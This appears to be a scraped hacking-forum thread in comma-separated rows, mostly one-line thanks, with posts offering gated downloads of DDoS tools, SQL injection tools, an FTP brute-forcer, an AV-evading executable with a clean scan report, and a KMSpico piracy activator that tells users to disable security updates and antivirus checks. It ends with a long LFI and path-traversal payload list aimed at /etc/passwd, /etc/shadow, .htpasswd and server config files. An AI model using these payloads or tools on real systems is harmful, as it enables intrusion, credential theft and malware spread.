"Clap clap, ty",oxidation
"ty man!!",oxidation
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn nnnnnnnnnnnnnnn",cyber_attacker
thnaks,naveen143
"i just found it on hackforums.. Download: You do not have sufficient rights to see the hidden data contained here.",anihilat0r
"thanks man",alexangel96
"FTP Brute Force PHP",jak0111
"thanks man",jak0111
"thanks man",jak0111
thnxxxcxxxxxxxx,fito5314
yeahhhhhhhh,fito5314
"nice share bro",lick1234
thanxxxxxxxxxx,umar
goooooooooooooood,bazik69
thankxxxxxxxxxxxxxxxx,sxops
"thx bro",lang200
"thanks for sharing",ovation
"thanks for share this",dxporn
thxxxxxxxxxxx,jockey
"thanks dude",jumperke
"thank you bro",sib881
thanks......,ripek
thankssssssssssssss,tukybatbai
thankssssssssssssssssss,tukybatbai
thnxxxxxxxxx,makpower
"thank you very much!",fastget
"hope it works, thanks",fastget
"thanks a lot",westy27
"nice work bro",back_slash
thankssssss,dfudin
Thanks....................,shalashaska
"Thank you!",hahi
"thank u bro hope your having a great day",locouseking69
"thanks dude",cpugate
thankssmenn,giannakosss
thanksmenn,giannakosss
thanksmann,giannakosss
"Thanks man",porichitomukh
"thank you,,,",dithy
"thank you very much",r1tual0mg
"thanks dude...",blackk88
"wah maknyos",rihac
"Thank you so much",mielony
"Please re-upload again man :(",dkgsf
"Thanks a lot",dkgsf
"Brute F0rc3 or Cracking?",megabedder
"Thanks for sharing",megabedder
falconjackie:899112,billy83
falconjackie:899112,billy83
"thanks a lot man",lindes11
"Thank you so much",daddy2002
"Nice work. Thanks",freeforall
"thanks buddy",shijustar
thankxxxxxxx,hackerz
"thank you very much for this",jamalpor2
"great thank you very much...",jamalpor2
"thank you very much",sk0601
"thank you very much",sk0601
"Thanks for the share",allusionx
"thanks a lot",wdrrbbggggde
"all links dont work",lindes11
"Thanks a Lot man",lindes11
"thnxxxxxxxxxxxxxxxxxx man",kgdtln
thanks.........................,sir
thanks...................,sir
"thanksssssssssssssssssssss alot",vor4000
thankyouuuuuuuu,seeeemih
"thank you mann",congueror
"Thanks Man",mamilan
thnkssssss,kishanlalit
"thanks a lot man",lindes11
"thanks man",lomi
"thanks for shaire..............",____sajid____
thansk....................................,sir
"thank alot man a very good post",d_2524_2540d_m_2540n
"Gonna take a look",maraacs
"just what i needed thanks",rizzy123
thxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,lnrv69
"thanks man",cemal_1988
ThANKSSSSSSSSSSSSS,physxtron
ahanaksssss,roor
"Thank you for this!!!!",balkanhax
"thank u more",borko92
Thanks!!!!,balkanhax
"Thank you!",balkanhax
"thanks man",paan95
"Thank you very much ^^",jsampas
"KMSpico v8.8.1 Final Quote: Activate Windows 7/8/2008/2012 Office 2010/2013 KMSpico - is the ideal tool to activate the final version of Windows 7/8 and Office 2010/2013. Activator does not require user intervention, the entire activation process takes place in the background, just run the activator and a couple of minutes to check the activation status of Windows and/or Office. Features: Versatility (activates: Vista/7/8; Office 2010/2013; Server 2008/2008R2/2012) Does not require active participation of the user (it is enough to start the activator). Simultaneous activation immediately and Windows, and Office. With KMSnano can: Activate Windows Vista Bussines/Enterprise Activate Windows 7 Activate Windows 8 Activate Windows (8.1 Preview) Activate Office 2010/2013 Activate Windows Server 2008/2008R2/2012 Based off of KMSEmulator of deagles. Thanks to deagles, mikmik38, qad, CODYQX4, xinso. All the credits for they. Thanks MyDigitalLife.info Thanks hui. Author: heldigard Note: - If you install a Office Retail Version after the installation of KMSpico, then run again the shortcut KMSpico to make the conversion, because the Service installed only activate VL. - Requirements: .NET 4.0 or Windows 8/2012. Recommendations Optional: - Disable Microsoft Security Updates. - Make exceptions to Directory %ProgramFiles%\KMSpico in Antivirus. How This Program Works: Install KMSpico v8.8.1 in Windows. Create Shortcuts for KMSpico. Run automatically KMSELDI and AutoPico. Make Tokens Backup. Detect VL or Retail and depending of the License Status activate or convert to VL. Activate for 180 days all VL products found. Install a windows service that reactive every windows start. Create a task schedule for AutoPico to run every 24 hours. Change Log: - Fixed tokens backup. - Add phone activation helper for Windows 8.1 RTM (needs intenet connection) Download Links : Code: http://rapidgator.net/file/50048a96beb43355af6366a71ac77161/ReleasePico.v8.8.1.rar.html http://filesflash.com/t5pploc6",multicracker
"link was broken create new link please",infinityhell
"nice share bro..... please update the link booz",reptile
"i want try it thanks",eyang_dubur
"Thanx man!!!",slip_knot
"Need a SQL Injection Vulnerable site list now",slip_knot
"Cool thanks error",slip_knot
"thanks bro",funufu
"thank you!!!",alamot
"nice share !!!!!!!",warlock72
"nice job.!!!!!!!",warlock72
"nice job!!!!!!!!!!",warlock72
"file removed from mediafire :( plz reupload to another share place",zetarox
"so thnx for explain",zetarox
"thanks man.....",thewiseman
"thanks man.....",thewiseman
"thanks man......",thewiseman
"thankxxxxxxx buddy",nike5650
thxxxxxxxxx,yoisala
"Thanks alot man!",wilabson
thanksssssss,e
"thanks a lot",silent08
"thank you very much",cauzer
thnx!!!!!!!!!!!!!!!!!!!!,wil0206
tahanaksssss,badea
thanksssssssssssss,badea
"thankss a lot ..",amit
thankssssss,medoo
thanksssssss,medoo
thamks,arumaaniaarun
thanks........................,sir
thanks......,sir
"Code: Date and Time: 8/31/2013 7:56:53 PM File Name: CRYTPADO.exe File Size: 176149 Bytes MD5: b9cfb17e79e51446ff69e75a2b0dd444 SHA1: 37e511ed46457f80fcc3727efa0e6a92850ea804 Detection: 0 of 35 (0%) Status: CLEAN AVG Free - Not Found! ArcaVir - Not Found! Avast - Not Found! AntiVir (Avira) - Not Found! BitDefender - Not Found! VirusBuster Internet Security - Not Found! Clam Antivirus - Not Found! COMODO Internet Security - Not Found! Dr.Web - Not Found! eTrust-Vet - Not Found! F-PROT Antivirus - Not Found! F-Secure Internet Security - Not Found! G Data - Not Found! IKARUS Security - Not Found! Kaspersky Antivirus - Not Found! McAfee - Not Found! MS Security Essentials - Not Found! ESET NOD32 - Not Found! Norman - Not Found! Norton Antivirus - Not Found! Panda Security - Not Found! A-Squared - Not Found! Quick Heal Antivirus - Not Found! Solo Antivirus - Not Found! Sophos - Not Found! Trend Micro Internet Security - Not Found! VBA32 Antivirus - Not Found! Zoner AntiVirus - Not Found! Ad-Aware - Not Found! BullGuard - Not Found! Immunet Antivirus - Not Found! K7 Ultimate - Not Found! NANO Antivirus - Not Found! Panda CommandLine - Not Found! VIPRE - Not Found! You do not have sufficient rights to see the hidden data contained here.",loading
"thnx in advance bro let me chk",cyberspy
"tahanaks crackingg fffd",trojanzboy
"download : You do not have sufficient rights to see the hidden data contained here. You do not have sufficient rights to see the hidden data contained here.",loading
"thanks man",crash2014
"thanks man..",loading
"Wow nice job.",matiasmunk
"Thanks for sharing. Looks like a great tool to have it !",salchichon
"thanks in advance",salchichon
"Thanks for sharing",salchichon
"thanks for this !!!!",etabeta
"thanks man",ifmenot
"I lo ve it...",ksssx1x2x
"thxx man you are just the best",microshit
Thankssssssss,play
niceeeeeeeeeeeeeee,ali
"tanks bbbbbbbbbb",ali
Thanks,saeedsam
"thanks you!",badforh
"thanks man",spesialis321
"thanks a lot",peterpeters21
"thank you for this",lolmedia
tyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy,psharma_1992
"thanks you",badforh
"thanks man",rulo
"hope it works xD",banger455
"i will check this",th3
"thanks a lot",slayyou
"thank you so much",mukky
"Thanks bro",alexong6187
"Thanks bro",alexong6187
"pretty cool",panickey
"Thanks dude DD",frostbite16
"thnx for sharing",
"will see",ano16
"thx dude you are the man",masterband01
"Thanks Man",masterband01
"thxx man you are the best",masterband01
"Thanks MAte",amiwest99
"thxxxx man !",azar
"thanks man",canomer
thanksssssssssssss,
"Thanks bro",
"thanks a lot",
"nice share",sofeahana
"let me try",nayanmoni
"nice .",hassan
"thanks friend",tisuto
"thanks man",poliguaco34
Thanks..,ivanov
"thank you bro",persian
"thank you!",manhattan696
thxxxxxxxxxxxx,ovoon7
"thanks ! for it bro !",axa
"thanks alot",hornyid
"thanks alot",hornyid
"This looks great!",neddles1997
"thanks man",l33tc0dex
"thanks man",l33tc0dex
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj,mokill
thaaaaaaaaaaaaaaaaaaaaaaanks,vintage_2599
"thanks man",l33tc0dex
"thanks man",l33tc0dex
"thanks man",l33tc0dex
"amazing share dude",sorucu10
thankssssss,noname
thanksssssssssssss,noname
thankssssssssssssssss,noname
thankssssssss,noname
"Looks amazing!",sorucu10
"Thank you so much",fontao
"Thank you so much",fontao
"Looks legit and amazing, thanks.",sorucu10
"thenks men",microshit
"I wonder..:/",cta_elmo
"thanks a lot",lolmedia
"Let's see this one",lolmedia
"did you code it ?",persian
"thenks men",donart
"nices tools men links dead.... please update new links.....",razor971
"Hope You guyx enjoying my tuts here is another One Albdevil Vulnerabilty Scanner easy to under stand if u use like this other scanners if any thing wrong tell me You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"[CENTER] [CENTER]SQL Poison You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"You do not have sufficient rights to see the hidden data contained here. Enjoy guys",_2540echo_257Fuw8ecr
"Droidsqli Android SQL injection Tool Salam To every One Some Time We bored and want to pick your phone and to to do some but hacker never let their work on mobile also as you guys know that Back Track is also available on Andriod But today i got some thing new For Hackers AS we know70% website hacked by using SQL injection. For automate SQL injection We need tool or OS - back track, havij or Kali, and etc..But now you can attack on site using your android mobile phone What You Need? 1 - SQL Vulnerable site 2 - android mobile (must) 3 - Droidsqli tool (Must) Download Link You do not have sufficient rights to see the hidden data contained here. If this is your first time to read about this tool then comment Thanks nd Enjoy [*]",_2540echo_257Fuw8ecr
"new tool it's script php ( whcms killer v3 ) some pictures for this script 3, data entry options Either manually or Either by placing path of config And either using the new option is short config After the data entry page appears Picture the following explanation of the list in the order Some pictures Script control rules And many New Options Download You do not have sufficient rights to see the hidden data contained here. Good LucK !",_2540echo_257Fuw8ecr
"Bang Bang.",jerue
vghjhjkgvhjkgjkgjk,pieman202
"thanks man",abm04786
"i can't find best crack wifi",markisa
"let see brooooooo",markisa
"ohhhh thanksss",gigska
Thxsssssssssssssssssssssssssssssssssss,prod03
"thanks this awesome",zmby555
thxxxxxxxxxxxxxxxxxxxxxxxxx,archimendus
"leets try this ouujuut Ehhh",geekmorpheus403
"lets see this awesome shit!!",geekmorpheus403
"Thanks bro",aftermath
"Why? You do not have sufficient rights to see the hidden data contained here.",das_ne0
"Quote: Originally Posted by UnraTed Huge collection of private Ddos tools. use them in sandbox. njoy Download *** hidden content *** like it want to see",equinox
Thanks!!!1,kryptozx
"thankssss man",keylock
thankssssssssssss,seeeemih
thnnnnnnnnnx,seeeemih
"thx XXXXXXXXXXXXXXXXXXXXXXX",seeeemih
"thanks will try this latter",djane
"Thanks alot",evilc0d3r
"Tnx Bro !!!!!!!!!!!",lordrasoul
"Thanks you !!",apocalypse
"thanks dude",kobra90
"Thanks bro",mvdig
"Thanks a lot.",django
"please update virus scans bro. and you coded it? that is super cool",unrated
"I have had alot of offers to sell this program but I turned them down hope you guys are enjoying this hehe had alot of requests for Tumblr but im unable to automate that site sorry, SoundCloud and Delicious have been added ENJOY!. FAQ- Q: What does this program do? A: This program creates accounts on multiple websites and saves the details for you Q: Does this program solve captcha and phone verification? A: No this program was coded in visual basic with basic coding skills I don't have the understanding. Q: Does this program support proxies? A: Yes i have tested public proxies with this program and aslong as they are fast they work fine Q: When will this program be multithreaded and solve captchas A: I don't know probably never, this program is coded by me and me only. I have basic knowledge of visual basic coding I don't sell this application so it will remain pretty basic deal with it :-) Q: How can i help this application improve A: Please provide detailed feedback of any problems or feature requests you have or if you would like I accept donations witch will allow me to spend more time coding. Q: Do you add websites upon request? A: Sure if i check out the website and im able to automate the form i will add it, simple. Q: This program does not work? A: I have not been coding this program for very long I have only tested it myself on UK version of websites if it does not work and your from another country im sorry. What's New- Added Support For SoundCloud Added Support For DeliciousRemoved Almost All Annoying Message Boxs Small Changes To Form Filling Small Changes To History Improvements To Gmail Account Creation Fixed Blog Address Problem In Wordpress Account Creation Added Support For Fiverr Added Progress And Status Text To Temp Email Added Progress And Status Text To Proxy Test Features- Automatically Creates Accounts On 20+ Websites Including Yahoo, Hotmail, Gmail, And Many More (Except Captcha) Manual Submitter (submit to custom email sites with the autofill menu "right click") Generates Full Profile With One Click 5 Built In Disposable Email Services (One Click) Real Names and Usernames (Editable) Proxy Support Advanced Profile System Advanced Settings Customizable Theme Handy Rightclick Autofill Menu Over 200,000 Built In Names Pictures- Virus Scan- http://virusscan.jotti.org/en/scanre...ad86eecaa13b12 https://www.virustotal.com/en/file/f...is/1369317989/ You do not have sufficient rights to see the hidden data contained here.",star41
thnxs,prod03
Thnxs,prod03
"interesting find. Let's try",avoyomalles
thankxxxxxxx,thelightishere
"thanks man",elgrande2013
thxxxxxxxxxx,asas14
tnxxxxx.....,rope
thnxxxxxxxxxxxxxxxxxxx,marshal123
"Thanks friend",tisuto
"thanks a lot",blueviper19858
"thxxxxx veery much",pcaidis
"thanks man",madeave
"thhhanks man",madeave
"thhanks man",madeave
"Thanks man !!",espabilaoo
thxxxxxxxxxxxxxxxxxxxx,mericim
"lets see!",torbendigel
thxxxxxxxxxxxxxx,biko
thxxxxxxxxxxxxxxxxxxxx,biko
thxxxxxxxxxxxxxxxxxxxxxxxxx,biko
thxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,biko
"thxxxxxxxxx veery much",biko
"thxxxxx veery much",biko
"thxxxx veery much",biko
"Let's see.",tl1996
"thkssssssss mannn",montud
thanksssss,scandoo
"nx awesome",torbendigel
"tnx awesome",xbytez
"You do not have sufficient rights to see the hidden data contained here.",unrated
thnxxxxxxxxxxxxxxxxxx,oohichamoo
"thanks bro :3",twister
"thanks for this !",kellyangel
thnxxxxxxxxxxxxxxxxxx,death
thnkxxxxxxxxxxxxxxx,death
thankxxxxxxxxxxx,death
thnxxxxxxxxxxxxxxxxxxx,death
thxxxxxxxxxxx,death
"thnk brother",iamnew
"nice work bro",death
"tnx for this",xbytez
"These are ebooks by Anurag Dwivedi. which helps a beginner to expertise into hacking. Download You do not have sufficient rights to see the hidden data contained here.",unrated
"i want to try this tnx",xbytez
"Huge collection of private Ddos tools. use them in sandbox. njoy Download You do not have sufficient rights to see the hidden data contained here.",unrated
"Bufferoverflow Eplained Download: You do not have sufficient rights to see the hidden data contained here.",unrated
"Metasploit Penetration Testing Cookbook Download: You do not have sufficient rights to see the hidden data contained here.",unrated
"nice s frends",re3z_2540l
"You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"The aircrack suite is an excellent collection of tools written by Christophe Devine to perform packet capture, packet injection and WEP / WPA cracking. Wildpackets' AiroPeek NX is software that performs packet analysis of IEEE 802.11 wireless LANs in support of security audits, site surveys, network management and troubleshooting. Download You do not have sufficient rights to see the hidden data contained here.",_2540echo_257Fuw8ecr
"Huge collection of LFI cheat sheet Code: /.../.../.../.../.../ \â?¦..\\\â?¦..\\\â?¦..\\\ %00../../../../../../etc/passwd %00/etc/passwd%00 %00../../../../../../etc/shadow %00/etc/shadow%00 %0a/bin/cat%20/etc/passwd %0a/bin/cat%20/etc/shadow /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..% 25%5c..%25%5c..%00 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..% 25%5c..%25%5c..%255cboot.ini /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini /../../../../../../../../%2A /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow =3D â??/..â? . â??%2f.. ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini admin/access_log /admin/install.php ../../../administrator/inbox /apache2/logs/access_log /apache2/logs/access.log /apache2/logs/error_log /apache2/logs/error.log /apache/logs/access_log /apache/logs/access.log ../../../../../apache/logs/access.log ../../../../apache/logs/access.log ../../../apache/logs/access.log ../../apache/logs/access.log ../apache/logs/access.log /apache/logs/error_log /apache/logs/error.log ../../../../../apache/logs/error.log ../../../../apache/logs/error.log ../../../apache/logs/error.log ../../apache/logs/error.log ../apache/logs/error.log /apache\php\php.ini \\&apos;/bin/cat%20/etc/passwd\\&apos; \\&apos;/bin/cat%20/etc/shadow\\&apos; /.bash_history /.bash_profile /.bashrc /../../../../../../../../bin/id| /bin/php.ini /boot/grub/grub.conf /./././././././././././boot.ini /../../../../../../../../../../../boot.ini /..\../..\../..\../..\../..\../..\../boot.ini /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini ..//..//..//..//..//boot.ini ../../../../../../../../../../../../boot.ini ../../boot.ini ..\../..\../..\../..\../boot.ini ..\../..\../boot.ini ..\..\..\..\..\..\..\..\..\..\boot.ini \..\..\..\..\..\..\..\..\..\..\boot.ini /../../../../../../../../../../../boot.ini%00 ../../../../../../../../../../../../boot.ini%00 ..\..\..\..\..\..\..\..\..\..\boot.ini%00 /../../../../../../../../../../../boot.ini%00.html /../../../../../../../../../../../boot.ini%00.jpg /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow c:\apache\logs\access.log c:\apache\logs\error.log c:\AppServ\MySQL C:/boot.ini C:\boot.ini /C:/inetpub/ftproot/ C:/inetpub/wwwroot/global.asa C:\inetpub\wwwroot\global.asa c:\inetpub\wwwroot\index.asp /config.asp ../config.asp config.asp ../config.inc.php config.inc.php ../config.js config.js _config.php ../_config.php ../config.php config.php ../_config.php%00 ../../../../../../../../conf/server.xml /core/config.php /C:\Program Files\ c:\Program Files\Apache Group\Apache\logs\access.log c:\Program Files\Apache Group\Apache\logs\error.log /.cshrc c:\System32\Inetsrv\metabase.xml c:WINDOWS/system32/ d:\AppServ\MySQL database.asp database.js database.php data.php dbase.php a db.php ../../../../../../../dev /D:\Program Files\ d:\System32\Inetsrv\metabase.xml /etc/apache2/apache2.conf /etc/apache2/conf/httpd.conf /etc/apache2/httpd.conf /etc/apache2/sites-available/default /etc/apache2/v*****.d/default_vhost.include /etc/apache/apache.conf /etc/apache/conf/httpd.conf /etc/apache/httpd.conf /etc/apt/sources.list /etc/chrootUsers /etc/crontab /etc/defaultdomain /etc/default/passwd /etc/defaultrouter /etc/fstab /etc/ftpchroot /etc/ftp***** /etc/group /etc/hostname.bge /etc/hostname.ce0 /etc/hostname.ce1 /etc/hostname.ce2 /etc/hostname.ce3 /etc/hostname.dcelx0 /etc/hostname.dcelx1 /etc/hostname.dcelx2 /etc/hostname.dcelx3 /etc/hostname.dmfe0 /etc/hostname.dmfe1 /etc/hostname.dmfe2 /etc/hostname.dmfe3 /etc/hostname.dnet0 /etc/hostname.dnet1 /etc/hostname.dnet2 /etc/hostname.dnet3 /etc/hostname.ecn0 /etc/hostname.ecn1 /etc/hostname.ecn2 /etc/hostname.ecn3 /etc/hostname.elx0 /etc/hostname.elx1 /etc/hostname.elx2 /etc/hostname.elx3 /etc/hostname.elxl0 /etc/hostname.elxl1 /etc/hostname.elxl2 /etc/hostname.elxl3 /etc/hostname.eri0 /etc/hostname.eri1 /etc/hostname.eri2 /etc/hostname.eri3 /etc/hostname.ge0 /etc/hostname.ge1 /etc/hostname.ge2 /etc/hostname.ge3 /etc/hostname.hme0 /etc/hostname.hme1 /etc/hostname.hme2 /etc/hostname.hme3 /etc/hostname.ieef0 /etc/hostname.ieef1 /etc/hostname.ieef2 /etc/hostname.ieef3 /etc/hostname.iprb0 /etc/hostname.iprb1 /etc/hostname.iprb2 /etc/hostname.iprb3 /etc/hostname.le0 /etc/hostname.le1 /etc/hostname.le2 /etc/hostname.le3 /etc/hostname.lo /etc/hostname.pcn0 /etc/hostname.pcn1 /etc/hostname.pcn2 /etc/hostname.pcn3 /etc/hostname.qfe0 /etc/hostname.qfe1 /etc/hostname.qfe2 /etc/hostname.qfe3 /etc/hostname.spwr0 /etc/hostname.spwr1 /etc/hostname.spwr2 /etc/hostname.spwr3 /etc/***** ../../../../../../../../../../../../etc/***** ../../../../../../../../../../../../etc/*****%00 /etc/*****.allow /etc/*****.deny /etc/*****.equiv /etc/http/conf/httpd.conf /etc/httpd.conf /etc/httpd/conf.d/php.conf /etc/httpd/conf.d/squirrelmail.conf /etc/httpd/conf.d/ssl.conf /etc/httpd/conf/httpd.conf /etc/httpd/httpd.conf /etc/httpd/logs/acces_log /etc/httpd/logs/acces.log ../../../../../../../etc/httpd/logs/acces_log ../../../../../../../etc/httpd/logs/acces.log /etc/httpd/logs/access_log /etc/httpd/logs/access.log ../../../../../etc/httpd/logs/access_log ../../../../../etc/httpd/logs/access.log /etc/httpd/logs/error_log /etc/httpd/logs/error.log ../../../../../../../etc/httpd/logs/error_log ../../../../../../../etc/httpd/logs/error.log ../../../../../etc/httpd/logs/error_log ../../../../../etc/httpd/logs/error.log /etc/httpd/php.ini /etc/http/httpd.conf /etc/inetd.conf /etc/init.d/apache /etc/init.d/apache2 /etc/issue /etc/logrotate.d/ftp /etc/logrotate.d/httpd /etc/logrotate.d/proftpd /etc/logrotate.d/vsftpd.log /etc/mail/access /etc/mailman/mm_cfg.py /etc/make.conf /etc/master.passwd /etc/motd /etc/my.cnf /etc/mysql/my.cnf /etc/netconfig /etc/nsswitch.conf /etc/opt/ipf/ipf.conf /etc/opt/ipf/ipnat.conf /./././././././././././etc/passwd /../../../../../../../../../../etc/passwd /../../../../../../../../../../etc/passwd^^ /..\../..\../..\../..\../..\../..\../etc/passwd /etc/passwd ../../../../../../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../etc/passwd ../../../../../../../../../../etc/passwd ../../../../../../../../../etc/passwd ../../../../../../../../etc/passwd ../../../../../../../etc/passwd ../../../../../../etc/passwd ../../../../../etc/passwd ../../../../etc/passwd ../../../etc/passwd ../../etc/passwd ../etc/passwd ..\..\..\..\..\..\..\..\..\..\etc\passwd .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd \..\..\..\..\..\..\..\..\..\..\etc\passwd etc/passwd /etc/passwd%00 ../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../../etc/passwd%00 ../../../../../../../../../../etc/passwd%00 ../../../../../../../../../etc/passwd%00 ../../../../../../../../etc/passwd%00 ../../../../../../../etc/passwd%00 ../../../../../../etc/passwd%00 ../../../../../etc/passwd%00 ../../../../etc/passwd%00 ../../../etc/passwd%00 ../../etc/passwd%00 ../etc/passwd%00 ..\..\..\..\..\..\..\..\..\..\etc\passwd%00 \..\..\..\..\..\..\..\..\..\..\etc\passwd%00 /../../../../../../../../../../../etc/passwd%00.html /../../../../../../../../../../../etc/passwd%00.jpg ../../../../../../etc/passwd&=%3C%3C%3C%3C /etc/php4.4/fcgi/php.ini /etc/php4/apache2/php.ini /etc/php4/apache/php.ini /etc/php4/cgi/php.ini /etc/php5/apache2/php.ini /etc/php5/apache/php.ini /etc/php5/cgi/php.ini /etc/php/apache2/php.ini /etc/php/apache/php.ini /etc/php/cgi/php.ini /etc/php.d/dom.ini /etc/php.d/gd.ini /etc/php.d/imap.ini /etc/php.d/json.ini /etc/php.d/ldap.ini /etc/php.d/mbstring.ini /etc/php.d/mysqli.ini /etc/php.d/mysql.ini /etc/php.d/odbc.ini /etc/php.d/pdo.ini /etc/php.d/pdo_mysql.ini /etc/php.d/pdo_odbc.ini /etc/php.d/pdo_pgsql.ini /etc/php.d/pdo_sqlite.ini /etc/php.d/pgsql.ini /etc/php.d/xmlreader.ini /etc/php.d/xmlwriter.ini /etc/php.d/xsl.ini /etc/php.d/zip.ini /etc/php.ini /etc/php/php4/php.ini /etc/php/php.ini /etc/postfix/mydomains /etc/proftp.conf /etc/proftpd/modules.conf /etc/protpd/proftpd.conf /etc/pure-ftpd.conf /etc/pureftpd.passwd /etc/pureftpd.pdb /etc/pure-ftpd/pure-ftpd.conf /etc/pure-ftpd/pure-ftpd.pdb /etc/pure-ftpd/pureftpd.pdb /etc/release /etc/resolv.conf /etc/rpc /etc/security/environ /etc/security/failedlogin /etc/security/group /etc/security/lastlog /etc/security/limits /etc/security/passwd /etc/security/user /./././././././././././etc/shadow /../../../../../../../../../../etc/shadow /../../../../../../../../../../etc/shadow^^ /..\../..\../..\../..\../..\../..\../etc/shadow /etc/shadow ../../../../../../../../../../../../etc/shadow ..\..\..\..\..\..\..\..\..\..\etc\shadow .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow \..\..\..\..\..\..\..\..\..\..\etc\shadow ../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00 ../../../../../../../../../../../../etc/shadow%00 ..\..\..\..\..\..\..\..\..\..\etc\shadow%00 \..\..\..\..\..\..\..\..\..\..\etc\shadow%00 etc/shadow%00 /etc/ssh/sshd_config /etc/sudoers /etc/syslog.conf /etc/syslogd.conf /etc/system /etc/updatedb.conf /etc/utmp /etc/vfstab /etc/vhcs2/proftpd/proftpd.conf /etc/vsftpd.chroot_list /etc/vsftpd.conf /etc/vsftpd/vsftpd.conf /etc/wtmp /etc/wu-ftpd/ftpaccess /etc/wu-ftpd/ftp***** /etc/wu-ftpd/ftpusers /.forward /home2\bin\stable\apache\php.ini /home/apache/conf/httpd.conf /home/apache/httpd.conf /home\bin\stable\apache\php.ini /.htpasswd .htpasswd ../.htpasswd ../install.php install.php ../../../../../../../../../../../../localstart.asp ../../../../../../../../../../../../localstart.asp%00 /log/miscDir/accesslog /.logout /logs/access_log /logs/access.log ../../../../../logs/access.log ../../../../logs/access.log ../../../logs/access.log ../../logs/access.log ../logs/access.log /logs/error_log /logs/error.log ../../../../../logs/error.log ../../../../logs/error.log ../../../logs/error.log ../../logs/error.log ../logs/error.log /logs/pure-ftpd.log /master.passwd member/.htpasswd members/.htpasswd /.netrc /NetServer\bin\stable\apache\php.ini /opt/apache2/conf/httpd.conf /opt/apache/conf/httpd.conf /opt/lampp/logs/access_log /opt/lampp/logs/access.log /opt/lampp/logs/error_log /opt/lampp/logs/error.log /opt/xampp/etc/php.ini /opt/xampp/logs/access_log /opt/xampp/logs/access.log /opt/xampp/logs/error_log /opt/xampp/logs/error.log .pass ../.pass pass.dat passwd /.passwd .passwd ../.passwd passwd.dat /php4\php.ini /php5\php.ini /php\php.ini /PHP\php.ini /private/etc/httpd/httpd.conf /private/etc/httpd/httpd.conf.default /proc/cpuinfo /proc/interrupts /proc/loadavg /proc/meminfo /proc/mounts /proc/net/arp /proc/net/dev /proc/net/route /proc/net/tcp /proc/partitions /proc/self/cmdline /proc/self/envron /proc/version /.profile /Program Files\Apache Group\Apache2\conf\httpd.conf /Program Files\Apache Group\Apache\conf\httpd.conf /Program Files\Apache Group\Apache\logs\access.log /Program Files\Apache Group\Apache\logs\error.log /Program Files\xampp\apache\conf\httpd.conf /../../../../pswd /.r***** /root/.bash_history /root/.bash_logut root/.htpasswd /root/.ksh_history /root/.Xauthority 